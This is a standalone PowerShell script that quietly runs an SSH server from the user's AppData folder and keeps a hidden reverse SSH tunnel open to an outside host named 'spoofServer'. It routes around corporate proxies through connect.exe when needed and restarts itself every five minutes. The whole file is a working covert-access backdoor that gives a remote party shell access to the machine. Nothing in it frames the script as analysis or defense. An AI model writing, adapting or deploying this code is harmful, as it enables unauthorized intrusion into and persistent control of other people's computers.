$sServer = "spoofServer";
$procPath = Join-Path $env:AppData "OpenSSH"
$loop = $true
do {
    $procstate = Get-Process | Where-Object {$_.Path -Like (Join-Path $procPath "sshd.exe")}
    if ($procstate -eq $null)
    {
        if ( -not (Test-Path (Join-Path $procPath "sshd.exe"))){
            $loop = $false
        }
        else {
            & Start-Process $procPath\sshd.exe -WindowStyle Hidden -WorkingDirectory $procPath -ArgumentList "-h $procPath\h\ssh_host_ed25519_key -f $procPath\sshd_config_default"
        }
    }
    $procstate = Get-Process | Where-Object {$_.Path -Like (Join-Path $procPath "ssh.exe")}
    if ($procstate -eq $null)
    {
        if ( -not (Test-Path (Join-Path $procPath "ssh.exe"))){
            $loop = $false
        }
        else {
            $proxy = [System.Net.WebRequest]::DefaultWebProxy.GetProxy("https://microsoft.com")
            if($proxy.host -eq "microsoft.com"){
                & Start-Process $procPath\ssh.exe -WindowStyle Hidden -WorkingDirectory $procPath -ArgumentList "-F $procPath\ssh_config -N -R remotePort:127.0.0.1:22 $sServer "
            }
            else{
                & Start-Process $procPath\ssh.exe -WindowStyle Hidden -WorkingDirectory $procPath -ArgumentList "-F $procPath\ssh_config -N -R remotePort:127.0.0.1:22 $sServer -o ProxyCommand="".\connect.exe -H $proxy.Host:$proxy.Port %h %p"""
            }
        }
    }
    Start-Sleep -Seconds 300
} while ($loop -eq $true)